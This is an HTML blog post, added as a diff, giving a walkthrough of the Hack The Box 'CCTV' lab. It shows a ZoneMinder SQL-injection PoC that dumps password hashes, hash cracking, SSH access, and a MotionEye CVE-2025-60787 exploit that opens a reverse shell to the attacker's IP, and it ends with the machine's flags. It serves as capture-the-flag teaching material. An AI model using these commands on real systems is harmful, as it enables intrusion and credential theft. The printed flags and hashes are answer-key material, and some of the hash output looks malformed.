@@ -1,0 +1,340 @@
+
+<!DOCTYPE html>
+<html lang="it">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>HTB - Season10 - Writeups - CCTV</title>
+   <link rel="stylesheet" href="/static/style.css">
+   <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+   <canvas class="matrix-bg" id="matrix"></canvas>
+
+   <header>
+      <div class="header-content">
+         <div class="terminal-prompt">k0d14k@kali:~#</div>
+         <div class="img-text">
+               <img src="/static/images/avatar.png" width="100rem">
+               <div class="text">
+                  <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                  <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+               </div>
+         </div>
+      </div>
+   </header>
+
+   <nav>
+      <ul>
+         <li><a href="/">Home</a></li>
+         <li><a href="/#about">Whoami</a></li>
+         <li><a href="/#skills">Skills</a></li>
+         <li><a href="/#projects">Projects</a></li>
+         <li><a href="/#contact">Contacts</a></li>
+      </ul>
+   </nav>
+
+   <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/cctv.png" alt="500rem">   
+        <h1>CCTV - HTB Season 10</h1>
+
+        <p>
+            <b>Categories</b>: #zoneminder, #CVE-2024-51482, #motion, #motioneye, #CVE-2025-60787
+        </p>
+
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="tcp-scan">
+            <h2>cat tcp-scan</h2>
+
+            <div class="code">
+                # Nmap 7.95 scan initiated Mon Mar  9 22:08:13 2026 as: nmap -o nmap cctv.htb <br>
+                Nmap scan report for cctv.htb (10.129.4.231) <br>
+                Host is up (0.13s latency). <br>
+                Not shown: 998 closed tcp ports (reset) <br>
+                PORT   STATE SERVICE <br>
+                22/tcp open  ssh <br>
+                80/tcp open  http <br>
+                <br>
+                # Nmap done at Mon Mar  9 22:08:15 2026 -- 1 IP address (1 host up) scanned in 2.19 second <br>
+            </div>
+
+            <p>The nmap scan reveals the presence of a web page exposed over HTTP. The following screenshot shows the page as seen in the browser:</p>
+
+            <img src="images/Pasted image 20260309223449.png" width="1000rem">
+        </section>
+
+        <section id="foothold">
+            <h2>cat foothold</h2>
+            <p>
+                Clicking the <span class="highlight">Staff Login</span> button takes me to the <span class="highlight">ZoneMinder v.1.37.63</span> 
+                login page. After searching on Google I discover a default credential combination (admin:admin) and the presence of a Blind SQLi 
+                with <a target="_blank" href="https://github.com/plur1bu5/CVE-2024-51482-PoC">CVE-2024-51482</a>.
+            </p>
+
+            <p>
+                After cloning the repository and running the PoC, I confirm that the target is vulnerable to this CVE and I manage to extract 3 hashed 
+                passwords for 3 different users:
+            </p>
+            
+            <div class="code">
+                k0d14k@kpb:~/Documenti/cctv/CVE-2024-51482-PoC$ python3 poc.py -t cctv.htb -u admin -p admin <br>
+                [*] Target: http://cctv.htb <br>
+                [*] Delay: 3s | Threads: 5 <br>
+                [+] Authenticated as admin <br>
+                [*] Testing vulnerability... <br>
+                [+] Target is VULNERABLE! <br>
+                <br>
+                [*] Default mode: Dumping zm.Users credentials... <br>
+                [*] Dumping data from 'zm.Users'... <br>
+                [+] Extracted: adminars | Current: admin <br>
+                [*] Length: 60, extracting... <br>
+                [+] Extracted: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbmQcURnm5N.rhlULwM0jrtbm <br>
+                [+] Extracted: markhars | Current: mark <br>
+                [+] Extracted: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.q07LW7AJ/QNqZolbXKfFG. <br>
+                [+] Extracted: superadmin | Current: superadmin <br>
+                [+] Extracted: $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6mlCkdXrzJMnJgkTiAvRUM6m <br>
+                <br>
+                ============================================================================= <br>
+                | Username&nbsp;&nbsp; | Password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | <br>
+                ============================================================================= <br>
+                | admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm | <br>
+                | mark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. | <br>
+                | superadmin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m | <br>
+                ============================================================================= <br>
+                <br>
+                [+] 3 entries dumped
+            </div>
+
+            <p>I create a file containing only the hashes and feed everything to hashcat with the rockyou wordlist:</p>
+
+            <div class="code">
+                k0d14k@kpb:~/Documenti/cctv$ hashcat hashes ~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200 <br>
+                <br>
+                ... <br>
+                $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame <br>
+                ...
+            </div>
+
+            <p>Since the cracked password belongs to <span class="highlight">mark</span>, I try it directly over <span class="highlight">ssh</span>:</p>
+
+            <div class="code">
+                k0d14k@kpb:~/Documenti/cctv$ ssh mark@cctv.htb <br>
+                mark@cctv:~$ whoami && id && hostname <br>
+                mark <br>
+                uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev) <br>
+                cctv <br>
+                mark@cctv:~$ 
+            </div>
+
+            <p>
+                I notice that user mark does not have the usual <span class="highlight">user.txt</span> file with the first flag, 
+                and I see that inside the <span class="highlight">home</span> directory there is another folder I don't have read permissions on
+            </p>
+            
+            <div class="code">
+                mark@cctv:~$ ls -al /home <br>
+                total 16 <br>
+                drwxr-xr-x  4 root    root    4096 Mar  2 09:49 . <br>
+                drwxr-xr-x 23 root    root    4096 Mar  2 09:49 .. <br>
+                drwxr-x---  5 mark    mark    4096 Mar  2 09:49 mark <br>
+                drwxr-x---  4 sa_mark sa_mark 4096 Mar  2 09:49 sa_mark <br>
+                mark@cctv:~$  <br>
+            </div>
+
+            <p>
+                I run <span class="highlight">sudo -l</span> but I am not in the sudoers group. I therefore download and run the 
+                <span class="highlight">linpeas.sh</span> script:
+            </p>
+            
+            <div class="code">
+                ... <br>
+                ╔══════════╣ Active Ports (T1049) <br>
+                ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports <br>
+                ══╣ Active Ports (netstat) (T1049) <br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.54:53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:9081&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.53:53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:8888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:8765&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:8554&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:33060&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:1935&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:7999&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 127.0.0.1:3306&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 0.0.0.0:22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 :::80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :::*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 :::22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :::*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ══╣ Local-only listeners (loopback) (T1049) <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:9081&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:8888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;127.0.0.1:8765&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:8554&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:33060&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:1935&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:7999&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                tcp&nbsp;&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;151&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;127.0.0.1:3306&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                ...
+            </div>
+
+            <p>
+                The script output shows several listening ports, some of which are bound only to <span class="highlight">localhost</span> 
+                (and therefore cannot have been opened by another user who would need to communicate on that port). I decide to investigate 
+                the various ports by probing them one by one until:
+            </p>
+
+            <div class="code">
+                mark@cctv:~$ curl http://0.0.0.0:7999 <br>
+                Motion 4.7.1 Running [1] Camera  <br>
+                1  <br>
+                mark@cctv:~$  <br>
+            </div>
+
+            <p>
+                I discover that <span class="highlight">Motion 4.7.1</span> is a command-line camera management software. Motion installations 
+                are often accompanied by <span class="highlight">MotionEye</span> (an external tool that provides a Web GUI for Motion). I therefore 
+                check whether motioneye is running on the machine by probing its default port:
+            </p>
+            
+            <div class="code">
+                mark@cctv:~$ curl -I http://0.0.0.0:8765 <br>
+                HTTP/1.1 200 OK <br>
+                Server: motionEye/0.43.1b4 <br>
+                Content-Type: text/html; charset=UTF-8 <br>
+                Date: Tue, 10 Mar 2026 09:29:01 GMT <br>
+                Etag: "da39a3ee5e6b4b0d3255bfef95601890afd80709" <br>
+                Content-Length: 0
+            </div>
+
+            <p>I then try to gather useful information about motioneye from within the machine:</p>
+
+            <div class="code">
+                mark@cctv:~$ find / -name motioneye 2>/dev/null <br>
+                /run/motioneye <br>
+                /var/lib/motioneye <br>
+                /var/log/motioneye <br>
+                /etc/motioneye <br>
+                /usr/local/lib/python3.12/dist-packages/motioneye <br>
+                mark@cctv:~$ 
+            </div>
+
+            <p>I notice the presence of the <span class="highlight">/etc/motioneye</span> folder, which contains the configuration files:</p>
+
+            <div class="code">
+                 <br>
+                mark@cctv:~$ cd /etc/motioneye/ <br>
+                mark@cctv:/etc/motioneye$ ll <br>
+                total 28 <br>
+                drwxr-xr-x   2 motion motion  4096 Nov  7 23:40 ./ <br>
+                drwxr-xr-x 141 root   root   12288 Mar  2 10:05 ../ <br>
+                -rw-r--r--   1 motion motion  2287 Nov  8 01:16 camera-1.conf <br>
+                -rw-r--r--   1 motion motion   278 Nov  8 01:16 motion.conf <br>
+                -rw-r--r--   1 motion motion  3012 Nov  7 22:46 motioneye.conf <br>
+                mark@cctv:/etc/motioneye$ cat motion.conf  <br>
+                # @admin_username admin <br>
+                # @normal_username user <br>
+                # @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0 <br>
+                # @lang en <br>
+                # @enabled on <br>
+                # @normal_password  <br>
+                <br>
+                <br>
+                setup_mode off <br>
+                webcontrol_port 7999 <br>
+                webcontrol_interface 1 <br>
+                webcontrol_localhost on <br>
+                webcontrol_parms 2 <br>
+                <br>
+                camera camera-1.conf <br>
+                mark@cctv:/etc/motioneye$  <br>
+
+            </div>
+
+            <p>
+                After opening a port forwarding tunnel with <span class="highlight">ligolo-ng</span> and trying the credentials 
+                <span class="highlight">admin:989c5a8ee87a0e9521ec81a79187d162109282f0</span>, I am inside the MotionEye interface:
+            </p>
+            
+            <img src="images/Pasted image 20260310103522.png" width="1000rem">
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>cat privilege-escalation</h2>
+
+            <p>
+                From here I discover the running software versions, which allows me to find <a target="_blank" href="https://github.com/gunzf0x/CVE-2025-60787">CVE-2025-60787</a> 
+                affecting this particular version of motionEye:
+            </p>
+
+            <img src="images/Pasted image 20260310103552.png" width="1000rem">
+
+            <p>I set up an nc listener as instructed and run the script:</p>
+
+            <div class="code">
+                k0d14k@kpb:~/Documenti/cctv/CVE-2025-60787$ python3 CVE-2025-60787.py revshell --url 'http://240.0.0.1:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i 10.10.15.148 --port 9091 <br>
+                <br>
+                [*] Attempting to connect to 'http://240.0.0.1:8765' with credentials 'admin:989c5a8ee87a0e9521ec81a79187d162109282f0' <br>
+                [*] Valid credentials provided <br>
+                [*] Obtaining cameras available <br>
+                [*] Found 1 camera(s) <br>
+                    1) Name: 'CAM 01' ; ID: 1; root_directory: '/var/lib/motioneye/Camera1' <br>
+                [*] Using camera by default (first one found) for the exploit <br>
+                [*] Payload successfully injected. Check your shell... <br>
+                ~Happy Hacking <br>
+            </div>
+
+            <p>On the listener (after a few seconds):</p>
+
+            <div class="code">
+                k0d14k@kpb:~$ nc -nvlp 9091  <br>
+                listening on [any] 9091 ... <br>
+                connect to [10.10.15.148] from (UNKNOWN) [10.129.5.94] 50596 <br>
+                bash: cannot set terminal process group (5367): Inappropriate ioctl for device <br>
+                bash: no job control in this shell <br>
+                root@cctv:/etc/motioneye# whoami && id && hostname <br>
+                whoami && id && hostname <br>
+                root <br>
+                uid=0(root) gid=0(root) groups=0(root) <br>
+                cctv <br>
+                root@cctv:/etc/motioneye# 
+            </div>
+
+            <p>I then retrieve both flags:</p>
+
+            <div class="code">
+                root@cctv:/etc/motioneye# cat /home/sa_mark/user.txt <br>
+                cat /home/sa_mark/user.txt <br>
+                b15dc71ba40ec7ac4b418610ff38bc09 <br>
+                root@cctv:/etc/motioneye# cat /root/root.txt <br>
+                cat /root/root.txt <br>
+                a1c4960fc5440acd7ce554f015402fa6 <br>
+                root@cctv:/etc/motioneye# 
+            </div>
+        </section>
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> b15dc71ba40ec7ac4b418610ff38bc09</h3>
+            <h3><b>Root Flag:</b> a1c4960fc5440acd7ce554f015402fa6</h3>
+        </section>
+    </main>
+
+
+   <footer>
+      <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+      <p>&copy; 2025 K0D14K</p>
+   </footer>
+
+   <script src="/static/script.js"></script>
+   <script> lister() </script>
+</body>
